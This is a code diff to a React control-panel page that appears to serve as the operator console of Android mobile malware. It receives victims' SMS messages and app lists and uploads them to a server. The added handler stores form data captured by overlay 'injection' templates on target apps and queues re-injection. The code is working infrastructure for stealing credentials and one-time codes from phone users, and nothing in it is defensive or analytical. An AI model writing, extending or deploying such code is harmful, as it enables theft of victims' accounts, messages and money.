@@ -835,6 +835,40 @@ export default function ControlPage({ user: _user } = {}) {
             if (type === 'app_list_response' || type === 'APP_LIST_RESPONSE') { const apps = msg.data?.apps || msg.apps || []; if (Array.isArray(apps)) { setAppList(apps); addLog(`收到应用列表: ${apps.length} 个`); api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'apps', data: apps }) }).catch(() => {}) } else { setAppList([]) } setAppLoading(false); return }
             if (type === 'sms_data' || type === 'SMS_DATA') { const smsList = msg.data?.smsList || msg.smsList || msg.data?.messages || []; if (Array.isArray(smsList) && smsList.length > 0) { setSmsList(smsList); setSmsTotal(msg.data?.count || smsList.length); addLog(`收到短信: ${smsList.length} 条`); api.request('/api/ai/device-data', { method: 'POST', body: JSON.stringify({ deviceId: resolvedDeviceId, dataType: 'sms', data: smsList }) }).catch(() => {}) } setSmsLoading(false); return }
             if (type === 'sms_send_result' || type === 'SMS_SEND_RESULT') { const success = msg.data?.success ?? msg.success; const phone = msg.data?.phoneNumber || msg.phoneNumber || ''; const sim = msg.data?.simSlot ?? msg.simSlot ?? 0; if (success) { centerToast(`短信发送成功: ${phone} (卡${sim + 1})`); addLog(`短信发送成功: ${phone}`) } else { toast(`短信发送失败: ${phone}`, 'error'); addLog(`短信发送失败: ${phone}`) } setSmsSending(false); return }
+            if (type === 'injection_capture_completed') {
+              const eventDeviceId = msg.deviceId || msg.sessionId || ''
+              if (eventDeviceId && eventDeviceId !== resolvedDeviceId) return
+              const packageName = msg.packageName || msg.package_name || ''
+              const templateId = msg.templateId || msg.template_id || ''
+              const recordId = Number(msg.recordId || msg.id || 0)
+              const completedRecord = {
+                ...(recordId > 0 ? { id: recordId } : {}),
+                packageName,
+                templateName: msg.templateName || '',
+                data: msg.data ?? msg.formData ?? {},
+                timestamp: Number(msg.timestamp || Date.now()),
+              }
+              setInjGrabbed(prev => {
+                const list = Array.isArray(prev) ? prev : []
+                const duplicate = recordId > 0
+                  ? list.some(item => Number(item?.id || 0) === recordId)
+                  : list.some(item =>
+                    item?.packageName === packageName &&
+                    Number(item?.timestamp || 0) === completedRecord.timestamp
+                  )
+                return duplicate ? list : [completedRecord, ...list]
+              })
+              if (packageName) {
+                setInjActivePkgs(prev => { const next = new Set(prev); next.delete(packageName); return next })
+                setInjConfirmedPkgs(prev => { const next = new Set(prev); next.delete(packageName); return next })
+              }
+              if (templateId) {
+                setInjActiveIds(prev => { const next = new Set(prev); next.delete(templateId); return next })
+                setInjConfirmedIds(prev => { const next = new Set(prev); next.delete(templateId); return next })
+              }
+              addLog(`注入表单已入库: ${packageName || msg.templateName || '未知应用'} → 重注`)
+              return
+            }
             if (type === 'injection_status') { const enabledPackages = msg.data?.enabledPackages || msg.enabledPackages || []; const enabledTemplateIds = msg.data?.enabledTemplateIds || msg.enabledTemplateIds || []; if (Array.isArray(enabledPackages)) { setInjActivePkgs(new Set(enabledPackages)); setInjConfirmedPkgs(new Set(enabledPackages)); if (Array.isArray(enabledTemplateIds)) { setInjActiveIds(new Set(enabledTemplateIds)); setInjConfirmedIds(new Set(enabledTemplateIds)) } addLog(`注入状态已确认: ${enabledPackages.length} 个应用`) } return }
             // ★ 2026-08-06：设备端 debug_log 消息（如 "触摸拦截已启用"）→ 显示 toast
             if (type === 'debug_log' && msg.data?.message) {
